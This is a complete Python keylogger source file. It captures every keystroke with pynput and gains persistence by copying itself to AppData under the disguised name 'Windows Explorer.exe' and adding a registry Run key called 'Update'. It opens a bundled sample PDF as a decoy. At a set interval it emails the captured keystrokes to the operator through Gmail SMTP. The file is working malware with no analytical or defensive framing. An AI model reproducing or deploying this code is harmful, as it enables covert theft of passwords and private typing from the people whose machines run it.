#!/usr/bin/env python
# encoding=utf8
import pynput.keyboard
import threading
import smtplib
import os
import sys
import shutil
import subprocess

log = ""

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.system_boot()
        self.log = "Started Logging Keys..."
        self.interval = time_interval
        self.email = email
        self.password = password

    def system_boot(self):
        keylogger_file_location = os.environ["AppData"] + "\\Windows Explorer.exe"
        if not os.path.exists(keylogger_file_location):
            shutil.copyfile(sys.executable, keylogger_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "' + keylogger_file_location + '"', shell=True)
            os.chdir(sys._MEIPASS)
            os.system('data_files\\sample.pdf')

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, " " + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
